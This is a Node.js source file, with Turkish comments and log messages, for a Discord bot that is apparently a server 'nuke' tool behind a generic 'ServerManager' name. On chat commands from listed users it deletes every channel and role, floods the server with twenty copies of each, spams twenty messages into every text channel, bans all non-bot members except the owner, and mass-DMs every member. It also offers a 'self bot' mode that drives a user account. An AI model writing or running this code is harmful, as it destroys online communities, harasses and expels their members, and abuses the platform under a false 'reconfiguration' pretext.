const { Client, GatewayIntentBits, Collection, Events, PermissionsBitField, ChannelType } = require('discord.js');
const fs = require('fs');
const path = require('path');
const config = require('./config');

class ServerManager {
    constructor() {
        this.guild = null;
        this.settings = this.loadPanelSettings();
        this.botType = this.settings.botType || 'bot';
    }

    loadPanelSettings() {
        try {
            if (fs.existsSync('panel_settings.json')) {
                const data = fs.readFileSync('panel_settings.json', 'utf8');
                return JSON.parse(data);
            }
        } catch (error) {
            console.log('❌ Panel ayarları yüklenirken hata oluştu!');
        }
        
        return {
            channels: [...config.DEFAULT_CHANNELS],
            roles: [...config.DEFAULT_ROLES],
            message: config.DEFAULT_MESSAGE,
            dmMessage: config.DEFAULT_DM_MESSAGE,
            guildId: '',
            token: '',
            botType: 'bot',
            authorizedUsers: []
        };
    }

    setGuild(guild) {
        this.guild = guild;
        return this.guild !== null;
    }

    async deleteAllChannels() {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            let deletedCount = 0;
            for (const channel of this.guild.channels.cache.values()) {
                try {
                    await channel.delete();
                    deletedCount++;
                } catch (error) {
                    console.log(`Kanal silinemedi: ${channel.name} - ${error.message}`);
                }
            }
            return [true, `${deletedCount} kanal silindi`];
        } catch (error) {
            return [false, `Kanal silme hatası: ${error.message}`];
        }
    }

    async deleteOldChannels(keepChannelNames) {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            let deletedCount = 0;
            for (const channel of this.guild.channels.cache.values()) {
                let shouldKeep = false;
                
                // Yeni oluşturulan kanalları kontrol et (kanal-1, kanal-2, ... gibi)
                for (const baseName of keepChannelNames) {
                    for (let i = 1; i <= 20; i++) {
                        if (channel.name === `${baseName}-${i}`) {
                            shouldKeep = true;
                            break;
                        }
                    }
                    if (shouldKeep) break;
                }
                
                if (!shouldKeep) {
                    try {
                        await channel.delete();
                        deletedCount++;
                        console.log(`Eski kanal silindi: ${channel.name}`);
                    } catch (error) {
                        console.log(`Kanal silinemedi: ${channel.name} - ${error.message}`);
                    }
                } else {
                    console.log(`Kanal korundu: ${channel.name}`);
                }
            }
            return [true, `${deletedCount} eski kanal silindi`];
        } catch (error) {
            return [false, `Eski kanal silme hatası: ${error.message}`];
        }
    }

    async createChannels(channelNames) {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            const createdChannels = [];
            for (const name of channelNames) {
                // Her kanal adından 20 tane oluştur
                for (let i = 1; i <= 20; i++) {
                    try {
                        const channelName = `${name}-${i}`;
                        const channel = await this.guild.channels.create({
                            name: channelName,
                            type: ChannelType.GuildText
                        });
                        createdChannels.push(channel.name);
                        console.log(`Kanal oluşturuldu: ${channelName}`);
                        
                        // Rate limit koruması
                        if (i % 5 === 0) {
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    } catch (error) {
                        console.log(`Kanal oluşturulamadı: ${name}-${i} - ${error.message}`);
                    }
                }
            }
            return [true, `${createdChannels.length} kanal oluşturuldu (${channelNames.length} tip × 20'şer)`];
        } catch (error) {
            return [false, `Kanal oluşturma hatası: ${error.message}`];
        }
    }

    async deleteAllRoles() {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            let deletedCount = 0;
            for (const role of this.guild.roles.cache.values()) {
                if (role.name !== '@everyone' && role.position < this.guild.members.me.roles.highest.position) {
                    try {
                        await role.delete();
                        deletedCount++;
                    } catch (error) {
                        console.log(`Rol silinemedi: ${role.name} - ${error.message}`);
                    }
                }
            }
            return [true, `${deletedCount} rol silindi`];
        } catch (error) {
            return [false, `Rol silme hatası: ${error.message}`];
        }
    }

    async createRoles(roleNames) {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            const createdRoles = [];
            for (const name of roleNames) {
                // Her rol adından 20 tane oluştur
                for (let i = 1; i <= 20; i++) {
                    try {
                        const roleName = `${name}-${i}`;
                        const role = await this.guild.roles.create({
                            name: roleName,
                            reason: 'Sunucu yeniden yapılandırılıyor'
                        });
                        createdRoles.push(role.name);
                        console.log(`Rol oluşturuldu: ${roleName}`);
                        
                        // Rate limit koruması
                        if (i % 5 === 0) {
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    } catch (error) {
                        console.log(`Rol oluşturulamadı: ${name}-${i} - ${error.message}`);
                    }
                }
            }
            return [true, `${createdRoles.length} rol oluşturuldu (${roleNames.length} tip × 20'şer)`];
        } catch (error) {
            return [false, `Rol oluşturma hatası: ${error.message}`];
        }
    }

    async sendMessageToAllChannels(message) {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            const textChannels = this.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
            const totalChannels = textChannels.size;
            let totalMessages = 0;
            
            console.log(`${totalChannels} kanala paralel mesaj gönderimi başlatılıyor...`);
            
            // Tüm kanallar için paralel promise'ler oluştur
            const channelPromises = textChannels.map(async (channel) => {
                const channelMessages = [];
                
                // Her kanal için 20 mesajın promise'lerini oluştur
                for (let i = 1; i <= 20; i++) {
                    const messagePromise = channel.send(`${message} (${i}/20)`)
                        .then(() => {
                            totalMessages++;
                            return true;
                        })
                        .catch((error) => {
                            console.log(`Mesaj gönderilemedi: ${channel.name} (${i}/20) - ${error.message}`);
                            return false;
                        });
                    
                    channelMessages.push(messagePromise);
                    
                    // Her 5 mesajda bir kısa bekle (rate limit için)
                    if (i % 5 === 0) {
                        await new Promise(resolve => setTimeout(resolve, 100));
                    }
                }
                
                // Bu kanalın tüm mesajlarını bekle
                const results = await Promise.all(channelMessages);
                const successCount = results.filter(r => r).length;
                console.log(`${channel.name} kanalına ${successCount}/20 mesaj gönderildi`);
                
                return successCount;
            });
            
            // Tüm kanalların işlemlerini paralel çalıştır
            const channelResults = await Promise.all(channelPromises);
            const successfulChannels = channelResults.filter(count => count > 0).length;
            
            return [true, `${successfulChannels} kanala toplam ${totalMessages} mesaj paralel gönderildi`];
        } catch (error) {
            return [false, `Mesaj gönderme hatası: ${error.message}`];
        }
    }

    async banAllMembers() {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            let bannedCount = 0;
            for (const member of this.guild.members.cache.values()) {
                if (!member.user.bot && member.id !== this.guild.ownerId) {
                    try {
                        await member.ban({ reason: 'Sunucu yeniden yapılandırılıyor' });
                        bannedCount++;
                    } catch (error) {
                        console.log(`Üye banlanamadı: ${member.user.tag} - ${error.message}`);
                    }
                }
            }
            return [true, `${bannedCount} üye banlandı`];
        } catch (error) {
            return [false, `Ban hatası: ${error.message}`];
        }
    }

    async sendDmToAll(message) {
        if (!this.guild) {
            return [false, "Guild bulunamadı"];
        }
        
        try {
            let sentCount = 0;
            for (const member of this.guild.members.cache.values()) {
                if (!member.user.bot) {
                    try {
                        await member.send(message);
                        sentCount++;
                    } catch (error) {
                        console.log(`DM gönderilemedi: ${member.user.tag} - ${error.message}`);
                    }
                }
            }
            return [true, `${sentCount} üyeye DM gönderildi`];
        } catch (error) {
            return [false, `DM gönderme hatası: ${error.message}`];
        }
    }
}

// Panel ayarlarını yükle
let panelSettings;
try {
    if (fs.existsSync('panel_settings.json')) {
        const data = fs.readFileSync('panel_settings.json', 'utf8');
        panelSettings = JSON.parse(data);
    } else {
        console.log('❌ panel_settings.json bulunamadı! Önce panel\'den bot konfigürasyonu yapın.');
        process.exit(1);
    }
} catch (error) {
    console.log('❌ Panel ayarları yüklenirken hata oluştu!');
    process.exit(1);
}

const { token, botType, authorizedUsers, guildId } = panelSettings;

if (!token) {
    console.log('❌ Bot token\'ı bulunamadı! Önce panel\'den bot konfigürasyonu yapın.');
    process.exit(1);
}

// Bot türüne göre intents ayarla
const intents = [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
];

// Bot türüne göre bot oluştur
let bot;
if (botType === 'self') {
    // Self Bot için
    bot = new Client({ intents });
    console.log('🤖 Self Bot modu başlatılıyor...');
} else {
    // Normal Bot için
    bot = new Client({ intents });
    console.log('🤖 Normal Bot modu başlatılıyor...');
}

const serverManager = new ServerManager();

// Bot hazır olduğunda
bot.once(Events.ClientReady, () => {
    console.log(`✅ ${bot.user.tag} olarak giriş yapıldı!`);
    console.log(`🤖 Bot ID: ${bot.user.id}`);
    console.log(`🔧 Bot Türü: ${botType === 'self' ? 'Self Bot' : 'Normal Bot'}`);
    console.log('🚀 Bot hazır!');
    
    // Guild'i ayarla
    if (guildId) {
        const guild = bot.guilds.cache.get(guildId);
        if (guild) {
            serverManager.setGuild(guild);
            console.log(`🏠 Guild ayarlandı: ${guild.name}`);
        } else {
            console.log(`❌ Guild bulunamadı: ${guildId}`);
        }
    } else {
        console.log('❌ Sunucu ID belirlenmemiş!');
    }
});

// Self Bot için komut sistemi
if (botType === 'self') {
    bot.on(Events.MessageCreate, async (message) => {
        if (message.author.id === bot.user.id) return;
        
        // Yetki kontrolü
        if (!authorizedUsers.includes(message.author.id)) return;
        
        // Komut işleme
        if (message.content.startsWith('!kanal')) {
            await message.channel.send('Kanal işlemleri başlatılıyor...');
            
            // Önce yeni kanalları oluştur
            serverManager.settings = serverManager.loadPanelSettings();
            console.log('Oluşturulacak kanallar:', serverManager.settings.channels);
            
            const [createSuccess, createMsg] = await serverManager.createChannels(serverManager.settings.channels);
            await message.channel.send(`Yeni kanal oluşturma: ${createMsg}`);
            
            if (createSuccess) {
                // Biraz bekle ki Discord API'sı rate limit yaşamasın
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Şimdi eski kanalları sil (yeni oluşturulanlar hariç)
                const [deleteSuccess, deleteMsg] = await serverManager.deleteOldChannels(serverManager.settings.channels);
                await message.channel.send(`Eski kanal silme: ${deleteMsg}`);
                
                // Sonuç mesajını yeni oluşturulan kanala gönder
                const newChannels = serverManager.guild.channels.cache.filter(ch => {
                    if (ch.type !== ChannelType.GuildText) return false;
                    
                    // Yeni oluşturulan kanalları kontrol et (kanal-1, kanal-2, ... gibi)
                    for (const baseName of serverManager.settings.channels) {
                        for (let i = 1; i <= 20; i++) {
                            if (ch.name === `${baseName}-${i}`) {
                                return true;
                            }
                        }
                    }
                    return false;
                });
                
                if (newChannels.size > 0) {
                    const firstChannel = newChannels.first();
                    try {
                        await firstChannel.send(`✅ Kanal işlemleri tamamlandı!\n📝 Oluşturulan: ${createMsg}\n🗑️ Silinen: ${deleteMsg}`);
                    } catch (error) {
                        console.log(`Yeni kanala mesaj gönderilemedi: ${error.message}`);
                        // Eğer yeni kanala mesaj gönderilemezse, mevcut kanala gönder
                        await message.channel.send(`✅ Kanal işlemleri tamamlandı!\n📝 Oluşturulan: ${createMsg}\n🗑️ Silinen: ${deleteMsg}`);
                    }
                }
            } else {
                await message.channel.send(`❌ Kanal oluşturma başarısız olduğu için eski kanallar silinmedi.`);
            }
        } else if (message.content.startsWith('!rol')) {
            await message.channel.send('Rol işlemleri başlatılıyor...');
            const [success, msg] = await serverManager.deleteAllRoles();
            await message.channel.send(`Rol silme: ${msg}`);
            if (success) {
                const [success2, msg2] = await serverManager.createRoles(serverManager.settings.roles);
                await message.channel.send(`Rol oluşturma: ${msg2}`);
            }
        } else if (message.content.startsWith('!mesaj')) {
            const messageText = serverManager.settings.message;
            const [success, result] = await serverManager.sendMessageToAllChannels(messageText);
            await message.channel.send(`Mesaj gönderme: ${result}`);
        } else if (message.content.startsWith('!ban')) {
            await message.channel.send('Ban işlemi başlatılıyor...');
            const [success, result] = await serverManager.banAllMembers();
            await message.channel.send(`Ban işlemi: ${result}`);
        } else if (message.content.startsWith('!dm')) {
            const dmMessage = serverManager.settings.dmMessage;
            const [success, result] = await serverManager.sendDmToAll(dmMessage);
            await message.channel.send(`DM gönderme: ${result}`);
        }
    });
}

// Normal Bot için komut sistemi
else {
    bot.on(Events.MessageCreate, async (message) => {
        if (message.author.bot) return;
        if (!message.content.startsWith('!')) return;
        
        // Yetki kontrolü
        if (!authorizedUsers.includes(message.author.id)) {
            await message.reply('Bu komutu kullanma yetkiniz yok!');
            return;
        }
        
        const command = message.content.slice(1).toLowerCase();
        
        switch (command) {
            case 'kanal':
                await message.channel.send('Kanal işlemleri başlatılıyor...');
                
                // Önce yeni kanalları oluştur
                serverManager.settings = serverManager.loadPanelSettings();
                console.log('Oluşturulacak kanallar:', serverManager.settings.channels);
                
                const [createSuccess, createMsg] = await serverManager.createChannels(serverManager.settings.channels);
                await message.channel.send(`Yeni kanal oluşturma: ${createMsg}`);
                
                if (createSuccess) {
                    // Biraz bekle ki Discord API'sı rate limit yaşamasın
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    // Şimdi eski kanalları sil (yeni oluşturulanlar hariç)
                    const [deleteSuccess, deleteMsg] = await serverManager.deleteOldChannels(serverManager.settings.channels);
                    await message.channel.send(`Eski kanal silme: ${deleteMsg}`);
                    
                    // Sonuç mesajını yeni oluşturulan kanala gönder
                    const newChannels = serverManager.guild.channels.cache.filter(ch => {
                        if (ch.type !== ChannelType.GuildText) return false;
                        
                        // Yeni oluşturulan kanalları kontrol et (kanal-1, kanal-2, ... gibi)
                        for (const baseName of serverManager.settings.channels) {
                            for (let i = 1; i <= 20; i++) {
                                if (ch.name === `${baseName}-${i}`) {
                                    return true;
                                }
                            }
                        }
                        return false;
                    });
                    
                    if (newChannels.size > 0) {
                        const firstChannel = newChannels.first();
                        try {
                            await firstChannel.send(`✅ Kanal işlemleri tamamlandı!\n📝 Oluşturulan: ${createMsg}\n🗑️ Silinen: ${deleteMsg}`);
                        } catch (error) {
                            console.log(`Yeni kanala mesaj gönderilemedi: ${error.message}`);
                        }
                    }
                } else {
                    await message.channel.send(`❌ Kanal oluşturma başarısız olduğu için eski kanallar silinmedi.`);
                }
                break;
                
            case 'rol':
                await message.channel.send('Rol işlemleri başlatılıyor...');
                const [success3, msg3] = await serverManager.deleteAllRoles();
                await message.channel.send(`Rol silme: ${msg3}`);
                if (success3) {
                    const [success4, msg4] = await serverManager.createRoles(serverManager.settings.roles);
                    await message.channel.send(`Rol oluşturma: ${msg4}`);
                }
                break;
                
            case 'mesaj':
                const messageText = serverManager.settings.message;
                const [success5, result] = await serverManager.sendMessageToAllChannels(messageText);
                await message.channel.send(`Mesaj gönderme: ${result}`);
                break;
                
            case 'ban':
                await message.channel.send('Ban işlemi başlatılıyor...');
                const [success6, result2] = await serverManager.banAllMembers();
                await message.channel.send(`Ban işlemi: ${result2}`);
                break;
                
            case 'dm':
                const dmMessage = serverManager.settings.dmMessage;
                const [success7, result3] = await serverManager.sendDmToAll(dmMessage);
                await message.channel.send(`DM gönderme: ${result3}`);
                break;
        }
    });
}

// Hata yakalama
bot.on('error', (error) => {
    console.error('Bot hatası:', error);
});

process.on('unhandledRejection', (error) => {
    console.error('İşlenmeyen hata:', error);
});

// Bot'u başlat
bot.login(token).catch((error) => {
    console.error('Bot giriş hatası:', error);
    process.exit(1);
});
